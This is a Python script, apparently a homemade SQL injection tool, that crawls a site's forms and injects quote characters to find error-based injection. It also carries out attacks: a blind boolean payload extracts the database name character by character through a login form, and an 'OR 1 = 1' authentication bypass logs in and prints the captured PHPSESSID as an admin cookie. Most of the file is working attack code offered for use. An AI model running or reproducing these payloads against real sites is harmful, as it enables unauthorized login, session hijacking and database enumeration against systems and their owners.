import requests,sys,re,argparse
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint


s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36"

def get_all_forms(url):
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    details = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response):
    errors = {
        "you have an error in your sql syntax;",
        "Warning",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "server error",
        "information_schema",
        "Warning",
        "Database error",
        "MySQL error",
        "SQL syntax",
        "error"
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def error_based(folder_name,url):
    file = open(folder_name+'/sqli_found.txt', 'a')
    for c in "\"'":  
        new_url = f"{url}{c}"
        print("[!] Trying", new_url)   
        res = s.get(new_url)
        if is_vulnerable(res):
            file.write(f"Error based sqli found : {new_url}\n")
            print("[+] SQL Injection vulnerability detected, link:", new_url)
            return
    
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for c in "\"'":    
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:                 
                    try:
                        data[input_tag["name"]] = input_tag["value"] + c
                    except:
                        pass
                elif input_tag["type"] != "submit":             
                    data[input_tag["name"]] = f"test{c}"
            
            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["method"] == "get":
                res = s.get(url, params=data)      
            if is_vulnerable(res):
                print("[+] SQL Injection vulnerability detected, link:", url)
                print("[+] Form:")
                pprint(form_details)
                file.write(f"Error based sqli found : {form_details}\n")

                break
def union_based(folder_name,url):
        file = open(folder_name+'/sqli_DB_found.txt', 'a')
        try:
            for i in range(1,25):
                for c in range(0x20,0x7f):
                    payload = "'OR BINARY substring(database(), %d, 1) = '%s' -- " %(i,chr(c))
                    data = {'username':payload, 'password':'1', 'login':'login'}
                    res = requests.post(url,data=data)

                    if 'admin' in res.text:
                        sys.stdout.write(chr(c))
                        file.write(f"{chr(c)}")
                        sys.stdout.flush()
                        break
                    else:
                        False
        except:
            pass
# sqliscanner da var elle test için.
def or_based(folder_name,url):
        file = open(folder_name+'/sqli_found.txt', 'a')
        try:
            session_url = requests.session()
            req = session_url.get(url)
            payload = """'OR 1 = 1 -- """
            data = {'username':payload,'password':'1','login':'login'}
            login = session_url.post(url, data=data)
            cookie = session_url.cookies["PHPSESSID"]
            if "admin" in login.text or "welcome" in login.text:
                print("-"* 50)
                print("[+] Login success!")
                print(f"[+] Admin cookie: {cookie}")
                #print(login.text)
                file.write(f"SQLI found  at : {url}\n")
                file.write(f"Payload : < {data} >\n")
                file.write("[+] Login success!\n")
                file.write("------------------\n")
        except:
            pass
